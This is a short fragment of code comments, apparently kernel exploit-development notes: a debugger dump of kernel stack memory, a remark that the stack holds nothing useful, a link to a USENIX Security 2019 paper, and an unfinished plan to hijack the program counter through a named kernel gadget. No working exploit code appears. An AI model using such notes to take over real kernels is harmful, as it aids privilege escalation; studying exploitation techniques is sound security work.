// 0xffffc900002a7fb0│+0x0118: 0x0000000044a5e7  →  0x173fffff0013d48  →  0x173fffff0013d48
// 0xffffc900002a7fb8│+0x0120: 0x00000000000002  →  0x00000000000002
// 0xffffc900002a7fc0│+0x0128: 0x00000000006b6b  →  0x00000000006b6b
// 0xffffc900002a7fc8│+0x0130: 0x00000000000003  →  0x00000000000003
// 0xffffc900002a7fd0│+0x0138: 0x00000000000010  →  0x00000000000010
// 0xffffc900002a7fd8│+0x0140: 0x0000000044a5e7  →  0x173fffff0013d48  →  0x173fffff0013d48
// 0xffffc900002a7fe0│+0x0148: 0x00000000000033  →  0x00000000000033
// 0xffffc900002a7fe8│+0x0150: 0x00000000000246  →  0x00000000000246
// 0xffffc900002a7ff0│+0x0158: 0x007ffc04e04778  →  0x0000000040108b  →  0xbd83fffef9688589  →  0xbd83fffef9688589
// 0xffffc900002a7ff8│+0x0160: 0x0000000000002b  →  0x0000000000002b
// 0xffffc900002a8000│+0x0168: 0xffffc900002a8000

// we actually doesn't have any interesting in stack
// https://www.usenix.org/system/files/sec19-wu-wei.pdf
// may use this one

// PC hijacking
// ->
// aliasing_gtt_unbind_vma (blooming gadget)
// ->
//
```


